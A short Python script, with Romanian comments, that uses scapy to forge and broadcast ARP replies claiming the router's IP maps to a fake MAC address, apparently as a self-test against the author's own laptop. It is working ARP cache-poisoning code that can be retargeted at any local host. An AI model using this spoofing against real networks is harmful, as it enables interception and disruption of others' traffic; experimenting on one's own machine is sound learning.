import scapy.all as scapy
import socket

# linia care gaseste IP-ul singura
ip_laptop = socket.gethostbyname(socket.gethostname())

ip_router = scapy.conf.route.route("0.0.0.0")[2]

# psrc = IP-ul routerului (192.168.0.1)
# pdst = IP-ul laptopului meu (detectat automat mai sus)
packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, psrc=ip_router, hwsrc="aa:bb:cc:dd:ee:ff", pdst=ip_laptop)

print(f"[+] Trimit pachete de test catre {ip_laptop}...")
scapy.sendp(packet, count=5, inter=1)